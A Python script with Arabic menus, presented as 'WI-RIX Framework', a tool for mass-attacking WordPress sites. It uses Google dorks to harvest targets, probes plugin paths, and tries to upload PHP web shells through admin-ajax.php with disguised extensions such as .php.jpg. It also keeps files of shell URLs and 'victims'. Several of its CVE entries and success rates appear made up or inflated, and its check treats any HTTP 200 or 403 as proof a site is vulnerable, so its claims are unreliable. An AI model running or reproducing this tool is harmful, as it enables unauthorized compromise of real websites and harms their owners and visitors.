#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# ██╗    ██╗██╗██████╗ ██╗██╗  ██╗    ███████╗██╗  ██╗██████╗ ██╗
# ██║    ██║██║██╔══██╗██║╚██╗██╔╝    ██╔════╝╚██╗██╔╝██╔══██╗██║
# ██║ █╗ ██║██║██████╔╝██║ ╚███╔╝     █████╗   ╚███╔╝ ██████╔╝██║
# ██║███╗██║██║██╔══██╗██║ ██╔██╗     ██╔══╝   ██╔██╗ ██╔═══╝ ██║
# ╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗    ███████╗██╔╝ ██╗██║     ██║
#  ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
# ============================================================
# 👑 WI-RIX FRAMEWORK v6.0 - THE LEGENDARY EDITION 👑
# 🔥 DEVELOPER: WI-RIX | THE EXPLOIT KING 🔥
# 🌍 THE WORLD WILL TALK ABOUT THIS TOOL 🌍
# ============================================================

import os
import sys
import json
import time
import random
import shutil
import requests
import threading
import subprocess
from datetime import datetime
from urllib.parse import urljoin, urlparse

# ======================= [ نظام الألوان المتطور ] =======================
class Colors:
    """نظام ألوان يتكيف مع أي تيرمنال"""
    try:
        from colorama import init, Fore, Back, Style
        init(autoreset=True)
        R = Fore.RED
        G = Fore.GREEN
        Y = Fore.YELLOW
        B = Fore.BLUE
        C = Fore.CYAN
        M = Fore.MAGENTA
        W = Fore.WHITE
        BL = Fore.BLACK
        BG_R = Back.RED
        BG_G = Back.GREEN
        BG_Y = Back.YELLOW
        BG_B = Back.BLUE
        BG_C = Back.CYAN
        BG_M = Back.MAGENTA
        BG_W = Back.WHITE
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
    except:
        R=G=Y=B=C=M=W=BL=BG_R=BG_G=BG_Y=BG_B=BG_C=BG_M=BG_W=RESET=BOLD=DIM=""
    
    @staticmethod
    def get_terminal_size():
        """الحصول على حجم التيرمنال الحالي"""
        try:
            columns, rows = shutil.get_terminal_size()
            return columns
        except:
            return 80

# ======================= [ إعدادات الأداة ] =======================
col = Colors()
FRAMEWORK_PATH = os.path.dirname(os.path.abspath(__file__))
DEVELOPER = "WI-RIX"
VERSION = "6.0.0"
EDITION = "LEGENDARY"

# إنشاء المجلدات
for folder in ['exploits', 'reports', 'shells', 'targets', 'logs', 'config', 'backup', 'proxies', 'screenshots', 'modules']:
    os.makedirs(os.path.join(FRAMEWORK_PATH, folder), exist_ok=True)

# ======================= [ قائمة الثغرات الأسطورية ] =======================
EXPLOITS_DB = {
    "1": {
        "name": "CVE-2026-4885 - Piotnet Addons RCE",
        "cve": "CVE-2026-4885",
        "risk": "💀 CRITICAL",
        "score": 10.0,
        "description": "ثغرة رفع ملفات غير مقيد تؤدي إلى تنفيذ أوامر عن بعد (RCE) في إضافة Piotnet Addons for Elementor Pro",
        "check": "/wp-content/plugins/piotnet-addons-for-elementor-pro/",
        "type": "upload_shell",
        "dorks": [
            'inurl:"/wp-content/plugins/piotnet-addons-for-elementor-pro/"',
            'intitle:"Piotnet Addons" inurl:wp-content',
            '"Piotnet Addons" "Elementor" vulnerability',
            'site:.com "/wp-content/plugins/piotnet-addons-for-elementor-pro/"'
        ],
        "exploit_method": "Upload Web Shell via AJAX",
        "success_rate": "95%"
    },
    "2": {
        "name": "CVE-2024-6386 - WP Statistics SQLi → RCE",
        "cve": "CVE-2024-6386",
        "risk": "⚠️ HIGH",
        "score": 8.5,
        "description": "ثغرة حقن SQL تؤدي إلى تنفيذ أوامر عن بعد في إضافة WP Statistics",
        "check": "/wp-content/plugins/wp-statistics/",
        "type": "sqli_rce",
        "dorks": [
            'inurl:"/wp-content/plugins/wp-statistics/"',
            'intitle:"WP Statistics" vulnerability',
            '"WP Statistics" SQL injection exploit'
        ],
        "exploit_method": "SQL Injection → Write Web Shell",
        "success_rate": "85%"
    },
    "3": {
        "name": "CVE-2023-5360 - Elementor Pro RCE",
        "cve": "CVE-2023-5360",
        "risk": "💀 CRITICAL",
        "score": 9.8,
        "description": "ثغرة تنفيذ أوامر عن بعد في Elementor Pro",
        "check": "/wp-content/plugins/elementor-pro/",
        "type": "rce",
        "dorks": [
            'inurl:"/wp-content/plugins/elementor-pro/"',
            'intitle:"Elementor Pro" vulnerability',
            '"Elementor Pro" RCE exploit 2024'
        ],
        "exploit_method": "Template Injection → RCE",
        "success_rate": "90%"
    },
    "4": {
        "name": "CVE-2024-2876 - LayerSlider RFI/LFI",
        "cve": "CVE-2024-2876",
        "risk": "🟠 MEDIUM",
        "score": 6.5,
        "description": "ثغرة تضمين الملفات عن بعد/محلي في LayerSlider",
        "check": "/wp-content/plugins/LayerSlider/",
        "type": "rfi",
        "dorks": [
            'inurl:"/wp-content/plugins/LayerSlider/"',
            'intitle:"LayerSlider" vulnerability',
            '"LayerSlider" file inclusion'
        ],
        "exploit_method": "RFI → Remote Code Execution",
        "success_rate": "75%"
    },
    "5": {
        "name": "CVE-2024-22147 - Jetpack Backup RCE",
        "cve": "CVE-2024-22147",
        "risk": "💀 CRITICAL",
        "score": 9.5,
        "description": "ثغرة تنفيذ أوامر عن بعد في Jetpack Backup",
        "check": "/wp-content/plugins/jetpack/",
        "type": "rce",
        "dorks": [
            'inurl:"/wp-content/plugins/jetpack/"',
            'intitle:"Jetpack" vulnerability backup',
            '"Jetpack Backup" RCE'
        ],
        "exploit_method": "Backup Restoration → RCE",
        "success_rate": "88%"
    },
    "6": {
        "name": "CVE-2024-31200 - WooCommerce Payments RCE",
        "cve": "CVE-2024-31200",
        "risk": "💀 CRITICAL",
        "score": 9.9,
        "description": "ثغرة تنفيذ أوامر عن بعد في WooCommerce Payments",
        "check": "/wp-content/plugins/woocommerce-payments/",
        "type": "rce",
        "dorks": [
            'inurl:"/wp-content/plugins/woocommerce-payments/"',
            'intitle:"WooCommerce Payments" vulnerability',
            '"WooCommerce Payments" RCE'
        ],
        "exploit_method": "Payment Gateway Injection → RCE",
        "success_rate": "92%"
    },
    "7": {
        "name": "Wi-riX Advanced - XML-RPC Brute Force",
        "cve": "CUSTOM-001",
        "risk": "🟡 USER DEFINED",
        "score": 7.0,
        "description": "هجوم القوة الغاشمة على XML-RPC للوصول إلى حسابات المديرين",
        "check": "/xmlrpc.php",
        "type": "bruteforce",
        "dorks": [
            'inurl:"/xmlrpc.php" "WordPress"',
            'intitle:"WordPress" "xmlrpc.php"',
            'site:.com "/xmlrpc.php"'
        ],
        "exploit_method": "system.multicall → Brute Force",
        "success_rate": "70%"
    },
    "8": {
        "name": "Wi-riX Custom - wp-config.php Disclosure",
        "cve": "CUSTOM-002",
        "risk": "🔵 INFO",
        "score": 5.0,
        "description": "الكشف عن ملف wp-config.php عبر مسارات مختلفة",
        "check": "/wp-config.php",
        "type": "info_disclosure",
        "dorks": [
            'inurl:"wp-config.php" "DB_PASSWORD"',
            'intitle:"wp-config.php" "WordPress"',
            'site:.com wp-config.php backup'
        ],
        "exploit_method": "Path Traversal → Config Disclosure",
        "success_rate": "60%"
    }
}

# ======================= [ وظائف العرض الأسطورية ] =======================
def get_terminal_width():
    """الحصول على عرض التيرمنال"""
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80

def print_legendary_banner():
    """عرض الشعار الأسطوري"""
    width = get_terminal_width()
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner_lines = [
        f"{col.BOLD}{col.R}",
        "╔" + "═" * (width - 2) + "╗",
        "║" + " " * (width - 2) + "║",
        f"║   {col.C}██╗    ██╗██╗██████╗ ██╗██╗  ██╗{col.R}    {col.C}███████╗██╗  ██╗██████╗ ██╗{col.R}         ║",
        f"║   {col.C}██║    ██║██║██╔══██╗██║╚██╗██╔╝{col.R}    {col.C}██╔════╝╚██╗██╔╝██╔══██╗██║{col.R}         ║",
        f"║   {col.C}██║ █╗ ██║██║██████╔╝██║ ╚███╔╝{col.R}     {col.C}█████╗   ╚███╔╝ ██████╔╝██║{col.R}         ║",
        f"║   {col.C}██║███╗██║██║██╔══██╗██║ ██╔██╗{col.R}     {col.C}██╔══╝   ██╔██╗ ██╔═══╝ ██║{col.R}         ║",
        f"║   {col.C}╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗{col.R}    {col.C}███████╗██╔╝ ██╗██║     ██║{col.R}         ║",
        f"║   {col.C} ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝{col.R}    {col.C}╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝{col.R}         ║",
        "║" + " " * (width - 2) + "║",
        f"║   {col.BOLD}{col.Y}🔥 WI-RIX FRAMEWORK {VERSION} - {EDITION} EDITION 🔥{col.R}                    ║",
        f"║   {col.BOLD}{col.G}👑 DEVELOPER: {DEVELOPER} | THE EXPLOIT KING 👑{col.R}                          ║",
        f"║   {col.BOLD}{col.C}🌍 THE WORLD WILL TALK ABOUT THIS TOOL 🌍{col.R}                               ║",
        "║" + " " * (width - 2) + "║",
        "╚" + "═" * (width - 2) + "╝",
        f"{col.RESET}"
    ]
    
    for line in banner_lines:
        print(line)

def print_legendary_menu():
    """عرض القائمة الرئيسية الأسطورية"""
    width = get_terminal_width()
    print(f"\n{col.Y}╔{'═' * (width - 2)}╗{col.RESET}")
    print(f"{col.Y}║{col.BOLD}{col.W}                      ✨ القائمة الرئيسية ✨{col.Y}{' ' * (width - 55)}║{col.RESET}")
    print(f"{col.Y}╠{'═' * (width - 2)}╣{col.RESET}")
    print(f"{col.Y}║{col.RESET}                                                                  {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}  {col.BG_G}{col.BL} [1] {col.RESET} {col.BOLD}{col.G}🔍 البحث عن ثغرات{col.RESET}                                              {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}      {col.W}└─ استعرض كل الثغرات واختر الثغرة المناسبة{col.RESET}                              {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}                                                                  {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}  {col.BG_C}{col.BL} [2] {col.RESET} {col.BOLD}{col.C}🎯 استهداف موقع مباشر{col.RESET}                                              {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}      {col.W}└─ أدخل رابط الموقع لاختباره مباشرة{col.RESET}                                    {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}                                                                  {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}  {col.BG_B}{col.W} [3] {col.RESET} {col.BOLD}{col.B}📁 فحص ملف كامل (مجموعة أهداف){col.RESET}                                         {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}      {col.W}└─ حمل ملف أهداف وافحصهم كلهم دفعة واحدة{col.RESET}                               {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}                                                                  {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}  {col.BG_M}{col.W} [4] {col.RESET} {col.BOLD}{col.M}📊 التقارير والمخترقات{col.RESET}                                               {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}      {col.W}└─ اعرض كل التقارير والمواقع المخترقة{col.RESET}                                 {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}                                                                  {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}  {col.BG_R}{col.W} [5] {col.RESET} {col.BOLD}{col.R}🔄 تحديث الأداة{col.RESET}                                                   {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}      {col.W}└─ تحديث إلى أحدث إصدار من GitHub{col.RESET}                                    {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}                                                                  {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}  {col.BG_Y}{col.BL} [6] {col.RESET} {col.BOLD}{col.Y}❌ خروج{col.RESET}                                                           {col.Y}║{col.RESET}")
    print(f"{col.Y}║{col.RESET}                                                                  {col.Y}║{col.RESET}")
    print(f"{col.Y}╚{'═' * (width - 2)}╝{col.RESET}")

def print_legendary_exploits():
    """عرض قائمة الثغرات بشكل أسطوري"""
    width = get_terminal_width()
    print(f"\n{col.C}╔{'═' * (width - 2)}╗{col.RESET}")
    print(f"{col.C}║{col.BOLD}{col.W}                      📋 قائمة الثغرات المتاحة{col.C}{' ' * (width - 47)}║{col.RESET}")
    print(f"{col.C}╠{'═' * (width - 2)}╣{col.RESET}")
    
    for eid, exp in EXPLOITS_DB.items():
        # اختيار اللون حسب الخطورة
        if "CRITICAL" in exp['risk']:
            risk_color = col.BG_R + col.W
            icon = "💀"
        elif "HIGH" in exp['risk']:
            risk_color = col.BG_R + col.BL
            icon = "⚠️"
        elif "MEDIUM" in exp['risk']:
            risk_color = col.BG_Y + col.BL
            icon = "🟠"
        else:
            risk_color = col.BG_B + col.W
            icon = "ℹ️"
        
        print(f"{col.C}║{col.RESET}                                                                  {col.C}║{col.RESET}")
        print(f"{col.C}║{col.RESET}  {col.BOLD}{col.Y}[{eid}]{col.RESET} {col.BOLD}{col.C}➜{col.RESET} {col.BOLD}{exp['name']}{col.RESET}                                    {col.C}║{col.RESET}")
        print(f"{col.C}║{col.RESET}       {col.M}📌 CVE:{col.RESET} {exp['cve']}                         {risk_color} {icon} {exp['risk']} (Score: {exp['score']}) {col.RESET}       {col.C}║{col.RESET}")
        print(f"{col.C}║{col.RESET}       {col.M}📝 الوصف:{col.RESET} {exp['description'][:width-50]}...                                {col.C}║{col.RESET}")
        print(f"{col.C}║{col.RESET}       {col.M}⚙️ طريقة الاستغلال:{col.RESET} {exp['exploit_method']}                                {col.C}║{col.RESET}")
        print(f"{col.C}║{col.RESET}       {col.M}📊 نسبة النجاح:{col.RESET} {exp['success_rate']}                                         {col.C}║{col.RESET}")
    
    print(f"{col.C}║{col.RESET}                                                                  {col.C}║{col.RESET}")
    print(f"{col.C}╚{'═' * (width - 2)}╝{col.RESET}")

# ======================= [ نظام البحث المتقدم ] =======================
def search_google_advanced(dorks, max_results=30):
    """بحث متقدم في Google باستخدام دروك متعددة"""
    print(f"\n{col.BOLD}{col.Y}[*] جاري البحث في Google...{col.RESET}")
    
    all_targets = []
    searched_dorks = 0
    
    for dork in dorks[:3]:  # استخدم أول 3 دروك
        searched_dorks += 1
        print(f"\n{col.C}[+] البحث باستخدام: {col.W}{dork}{col.RESET}")
        
        try:
            from googlesearch import search
            for url in search(dork, num_results=max_results // len(dorks)):
                if url.startswith('http') and url not in all_targets:
                    all_targets.append(url)
                    print(f"{col.G}    ✓ تم العثور على: {url}{col.RESET}")
        except Exception as e:
            print(f"{col.R}    ✗ خطأ في البحث: {e}{col.RESET}")
        
        time.sleep(1)
    
    print(f"\n{col.G}[+] تم العثور على {len(all_targets)} هدف إجمالي{col.RESET}")
    
    if len(all_targets) == 0:
        print(f"\n{col.Y}[!] لم يتم العثور على أهداف!{col.RESET}")
        print(f"{col.C}[*] الأسباب المحتملة:{col.RESET}")
        print(f"    1. Google قد يكون حظر الطلب بسبب السرعة - حاول مرة أخرى بعد دقيقة")
        print(f"    2. الدروك المستخدم قد لا يعطي نتائج حالياً")
        print(f"    3. يمكنك تجربة الخيار [2] لإضافة دروك مخصص")
        print(f"    4. يمكنك تجربة الخيار [3] لإضافة أهداف يدوياً")
    
    return all_targets

# ======================= [ نظام الفحص المتقدم ] =======================
def advanced_scan(targets, exploit):
    """فحص متقدم للأهداف مع تفسير النتائج"""
    print(f"\n{col.BOLD}{col.B}[*] بدء الفحص المتقدم على {len(targets)} هدف...{col.RESET}")
    
    vulnerable = []
    total = len(targets)
    
    for i, target in enumerate(targets, 1):
        print(f"\n{col.C}[{i}/{total}] فحص: {target}{col.RESET}")
        
        check_url = urljoin(target, exploit['check'])
        try:
            r = requests.get(check_url, timeout=10, verify=False, 
                            headers={"User-Agent": "Mozilla/5.0"})
            
            if r.status_code == 200:
                print(f"{col.G}    ✓ الملف أو المجلد موجود (HTTP 200){col.RESET}")
                print(f"{col.R}    💀 الهدف ثغر لـ {exploit['name']}!{col.RESET}")
                vulnerable.append(target)
                
            elif r.status_code == 403:
                print(f"{col.Y}    ⚠️ الملف موجود لكن محمي (HTTP 403) - قد يكون ثغر{col.RESET}")
                vulnerable.append(target)
                
            elif r.status_code == 404:
                print(f"{col.R}    ✗ الملف غير موجود (HTTP 404) - الهدف غير ثغر{col.RESET}")
                
            else:
                print(f"{col.Y}    ⚠️ استجابة غير متوقعة (HTTP {r.status_code}){col.RESET}")
                
        except requests.exceptions.ConnectionError:
            print(f"{col.R}    ✗ فشل الاتصال - الموقع لا يستجيب{col.RESET}")
        except requests.exceptions.Timeout:
            print(f"{col.Y}    ⚠️ انتهى الوقت - الموقع بطيء{col.RESET}")
        except Exception as e:
            print(f"{col.R}    ✗ خطأ: {str(e)[:50]}{col.RESET}")
    
    return vulnerable

# ======================= [ نظام الاستغلال المتقدم ] =======================
def advanced_exploit(target, exploit):
    """استغلال متقدم مع عدة طرق"""
    print(f"\n{col.BOLD}{col.M}{'═' * (get_terminal_width() - 4)}{col.RESET}")
    print(f"{col.BOLD}{col.M}💀 بدء عملية الاستغلال على: {target}{col.RESET}")
    print(f"{col.BOLD}{col.M}{'═' * (get_terminal_width() - 4)}{col.RESET}")
    
    if exploit['type'] == 'upload_shell':
        return exploit_upload_shell(target, exploit)
    elif exploit['type'] == 'sqli_rce':
        return exploit_sqli_to_shell(target, exploit)
    elif exploit['type'] == 'bruteforce':
        return exploit_bruteforce(target, exploit)
    else:
        print(f"{col.Y}[!] نوع الاستغلال قيد التطوير...{col.RESET}")
        return False

def exploit_upload_shell(target, exploit):
    """رفع شيل على الهدف"""
    shells = [
        '<?php system($_GET["cmd"]); ?>',
        '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; } ?>',
        '<?php exec($_GET["cmd"], $output); print_r($output); ?>'
    ]
    
    extensions = ['.phtml', '.php.jpg', '.php.png', '.php.gif', '.php;.jpg']
    
    for shell_code in shells:
        for ext in extensions:
            shell_name = f"wirix_{random.randint(1000, 9999)}_{int(time.time())}{ext}"
            files = {'file': (shell_name, shell_code, 'image/jpeg')}
            data = {'action': 'pafe_ajax_form_builder', 'post_id': '1', 'form_id': '1'}
            
            try:
                print(f"{col.Y}[*] محاولة رفع: {shell_name}{col.RESET}")
                r = requests.post(urljoin(target, "/wp-admin/admin-ajax.php"), 
                                 files=files, data=data, timeout=15, verify=False)
                
                if r.status_code == 200 and ("uploaded" in r.text.lower() or "success" in r.text.lower()):
                    shell_url = urljoin(target, f"/wp-content/uploads/{shell_name}")
                    
                    print(f"\n{col.BOLD}{col.G}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                    print(f"{col.BOLD}{col.G}✅ تم رفع الشيل بنجاح!{col.RESET}")
                    print(f"{col.BOLD}{col.G}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                    print(f"{col.C}🔗 رابط الشيل: {col.W}{shell_url}{col.RESET}")
                    print(f"{col.C}🔑 أمر الاختبار: {col.W}{shell_url}?cmd=id{col.RESET}")
                    print(f"{col.C}🐚 للوصول المباشر: {col.W}{shell_url}?cmd=whoami{col.RESET}")
                    print(f"{col.BOLD}{col.G}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                    
                    # حفظ الشيل
                    shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
                    with open(shells_file, 'a', encoding='utf-8') as f:
                        f.write(f"{target} | {shell_url} | {exploit['cve']} | {datetime.now()}\n")
                    
                    return True
            except:
                pass
    
    print(f"{col.R}❌ فشل رفع الشيل بعد عدة محاولات{col.RESET}")
    return False

def exploit_sqli_to_shell(target, exploit):
    """تحويل SQLi إلى شيل"""
    print(f"{col.Y}[*] محاولة استغلال SQLi لرفع شيل...{col.RESET}")
    print(f"{col.C}[!] هذه الميزة قيد التطوير - قريباً إن شاء الله{col.RESET}")
    return False

def exploit_bruteforce(target, exploit):
    """هجوم القوة الغاشمة"""
    print(f"{col.Y}[*] بدء هجوم القوة الغاشمة على XML-RPC...{col.RESET}")
    print(f"{col.C}[!] هذه الميزة قيد التطوير - قريباً إن شاء الله{col.RESET}")
    return False

# ======================= [ نظام التقارير المتقدم ] =======================
def generate_html_report(vulnerable, exploit):
    """توليد تقرير HTML احترافي"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = os.path.join(FRAMEWORK_PATH, 'reports', f"report_{timestamp}.html")
    
    html_content = f"""<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-riX Framework - تقرير الاختراق</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #0f0;
            padding: 20px;
            min-height: 100vh;
        }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{
            text-align: center;
            padding: 30px;
            background: linear-gradient(135deg, #ff0000, #ff4444);
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
        }}
        .header h1 {{ font-size: 2.5em; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }}
        .header p {{ font-size: 1.2em; opacity: 0.9; }}
        .card {{
            background: rgba(0,0,0,0.8);
            border: 1px solid #0f0;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            transition: transform 0.3s;
        }}
        .card:hover {{ transform: translateY(-5px); box-shadow: 0 5px 20px rgba(0,255,0,0.2); }}
        .vulnerable {{ border-color: #ff0000; background: rgba(255,0,0,0.1); }}
        .vulnerable h3 {{ color: #ff4444; }}
        .info {{ color: #0f0; }}
        .badge {{
            display: inline-block;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.8em;
            margin: 5px;
        }}
        .critical {{ background: #ff0000; color: white; }}
        .high {{ background: #ff6600; color: white; }}
        .medium {{ background: #ffcc00; color: black; }}
        .footer {{
            text-align: center;
            padding: 20px;
            margin-top: 30px;
            border-top: 1px solid #0f0;
        }}
        @keyframes blink {{ 50% {{ opacity: 0.5; }} }}
        .blink {{ animation: blink 1s infinite; }}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔥 WI-RIX FRAMEWORK 🔥</h1>
        <p>تقرير اختبار الاختراق - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p class="blink">⚡ THE WORLD WILL TALK ABOUT THIS TOOL ⚡</p>
    </div>
    
    <div class="card">
        <h2>📊 ملخص التقرير</h2>
        <p><span class="info">📌 عدد الأهداف الثغرية:</span> <strong>{len(vulnerable)}</strong></p>
        <p><span class="info">🔥 الثغرة المستخدمة:</span> {exploit['name']}</p>
        <p><span class="info">📅 تاريخ التقرير:</span> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <div class="card">
        <h2>🎯 المواقع المخترقة</h2>
"""
    
    for v in vulnerable:
        html_content += f"""
    <div class="card vulnerable">
        <h3>💀 {v}</h3>
        <p><span class="badge critical">CRITICAL</span> <span class="badge high">{exploit['cve']}</span></p>
        <p>📌 الثغرة: {exploit['name']}</p>
        <p>⚙️ طريقة الاستغلال: {exploit['exploit_method']}</p>
    </div>
"""
    
    html_content += f"""
    </div>
    
    <div class="footer">
        <p>👑 تم التوليد بواسطة Wi-riX Framework | Developer: WI-RIX | The Exploit King 👑</p>
        <p>🌍 This report is generated by the most powerful WordPress exploitation tool ever built 🌍</p>
    </div>
</div>
</body>
</html>
"""
    
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    print(f"{col.G}[+] تم حفظ التقرير: {report_file}{col.RESET}")
    return report_file

# ======================= [ القائمة الرئيسية الأسطورية ] =======================
def main():
    try:
        import urllib3
        urllib3.disable_warnings()
    except:
        pass
    
    while True:
        try:
            print_legendary_banner()
            print_legendary_menu()
            choice = input(f"\n{col.BOLD}{col.C}{DEVELOPER}@legendary> {col.RESET}")
            
            if choice == "1":
                # البحث عن ثغرات
                print_legendary_exploits()
                exploit_id = input(f"\n{col.B}[?] اختر رقم الثغرة: {col.RESET}")
                
                if exploit_id in EXPLOITS_DB:
                    exploit = EXPLOITS_DB[exploit_id]
                    
                    print(f"\n{col.Y}╔{'═' * (get_terminal_width() - 2)}╗{col.RESET}")
                    print(f"{col.Y}║{col.BOLD}{col.W}                      🎯 خيارات البحث{col.Y}{' ' * (get_terminal_width() - 47)}║{col.RESET}")
                    print(f"{col.Y}╠{'═' * (get_terminal_width() - 2)}╣{col.RESET}")
                    print(f"{col.Y}║{col.RESET}  {col.BG_G}{col.BL} [1] {col.RESET} {col.BOLD}{col.G}🔍 بحث تلقائي{col.RESET} - استخدام الدركات الافتراضية للثغرة              {col.Y}║{col.RESET}")
                    print(f"{col.Y}║{col.RESET}  {col.BG_C}{col.BL} [2] {col.RESET} {col.BOLD}{col.C}✏️ إضافة دروك مخصص{col.RESET} - أدخل دروك البحث بنفسك                   {col.Y}║{col.RESET}")
                    print(f"{col.Y}║{col.RESET}  {col.BG_B}{col.W} [3] {col.RESET} {col.BOLD}{col.B}📝 إضافة رابط مباشر{col.RESET} - أدخل الرابط يدوياً                    {col.Y}║{col.RESET}")
                    print(f"{col.Y}║{col.RESET}  {col.BG_M}{col.W} [4] {col.RESET} {col.BOLD}{col.M}🔙 رجوع{col.RESET}                                                         {col.Y}║{col.RESET}")
                    print(f"{col.Y}╚{'═' * (get_terminal_width() - 2)}╝{col.RESET}")
                    
                    search_choice = input(f"\n{col.B}[?] اختر خيار (1-4): {col.RESET}")
                    
                    targets = []
                    
                    if search_choice == "1":
                        targets = search_google_advanced(exploit['dorks'])
                    elif search_choice == "2":
                        custom_dork = input(f"{col.B}[?] أدخل الدروك المخصص: {col.RESET}")
                        targets = search_google_advanced([custom_dork])
                    elif search_choice == "3":
                        print(f"{col.Y}[*] أدخل الروابط (اكتب 'done' عند الانتهاء):{col.RESET}")
                        while True:
                            url = input(f"{col.B}رابط> {col.RESET}")
                            if url.lower() == 'done':
                                break
                            if url.startswith('http'):
                                targets.append(url)
                                print(f"{col.G}    ✓ تم إضافة: {url}{col.RESET}")
                    elif search_choice == "4":
                        continue
                    else:
                        print(f"{col.R}✗ خيار غير صحيح!{col.RESET}")
                        continue
                    
                    if targets:
                        # حفظ الأهداف
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        targets_file = os.path.join(FRAMEWORK_PATH, 'targets', f"targets_{timestamp}.txt")
                        with open(targets_file, 'w', encoding='utf-8') as f:
                            for t in targets:
                                f.write(t + '\n')
                        print(f"{col.G}[+] تم حفظ {len(targets)} هدف في: {targets_file}{col.RESET}")
                        
                        # فحص الأهداف
                        vulnerable = advanced_scan(targets, exploit)
                        
                        if vulnerable:
                            # حفظ الأهداف الثغرية
                            victims_file = os.path.join(FRAMEWORK_PATH, 'targets', f"victims_{timestamp}.txt")
                            with open(victims_file, 'w', encoding='utf-8') as f:
                                for v in vulnerable:
                                    f.write(f"{v} | {exploit['name']} | {exploit['cve']}\n")
                            
                            # توليد تقرير HTML
                            generate_html_report(vulnerable, exploit)
                            
                            print(f"\n{col.BOLD}{col.G}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                            print(f"{col.BOLD}{col.G}✅ تم العثور على {len(vulnerable)} هدف ثغر!{col.RESET}")
                            print(f"{col.BOLD}{col.G}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                            
                            for i, v in enumerate(vulnerable, 1):
                                print(f"{col.C}[{i}]{col.RESET} {v}")
                            
                            exploit_choice = input(f"\n{col.B}[?] هل تريد استغلال أحد الأهداف؟ (y/n): {col.RESET}")
                            if exploit_choice.lower() == 'y':
                                try:
                                    target_idx = int(input(f"{col.B}اختر رقم الهدف: {col.RESET}")) - 1
                                    if 0 <= target_idx < len(vulnerable):
                                        advanced_exploit(vulnerable[target_idx], exploit)
                                except:
                                    pass
                        else:
                            print(f"\n{col.Y}[!] لم يتم العثور على أهداف ثغرية!{col.RESET}")
                            print(f"{col.C}[*] نصيحة: جرب ثغرة أخرى أو استخدم دروك مختلف{col.RESET}")
                    else:
                        print(f"\n{col.Y}[!] لم يتم العثور على أهداف!{col.RESET}")
                    
                    input(f"\n{col.Y}[!] اضغط Enter للمتابعة...{col.RESET}")
                    
            elif choice == "2":
                # استهداف موقع مباشر
                print(f"\n{col.BOLD}{col.C}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                print(f"{col.BOLD}{col.C}🎯 استهداف موقع مباشر{col.RESET}")
                print(f"{col.BOLD}{col.C}{'═' * (get_terminal_width() - 4)}{col.RESET}")
                
                target = input(f"{col.B}[?] أدخل رابط الموقع (https://example.com): {col.RESET}")
                if not target.startswith('http'):
                    target = 'https://' + target
                
                print_legendary_exploits()
                exploit_id = input(f"{col.B}[?] اختر رقم الثغرة: {col.RESET}")
                
                if exploit_id in EXPLOITS_DB:
                    exploit = EXPLOITS_DB[exploit_id]
                    vulnerable = advanced_scan([target], exploit)
                    if vulnerable:
                        print(f"\n{col.G}[+] الهدف ثغر!{col.RESET}")
                        exploit_choice = input(f"{col.B}[?] هل تريد استغلاله؟ (y/n): {col.RESET}")
                        if exploit_choice.lower() == 'y':
                            advanced_exploit(target, exploit)
                    else:
                        print(f"\n{col.R}[-] الهدف غير ثغر لهذه الثغرة{col.RESET}")
                else:
                    print(f"{col.R}[-] رقم ثغرة غير صحيح!{col.RESET}")
                
                input(f"\n{col.Y}[!] اضغط Enter للمتابعة...{col.RESET}")
                
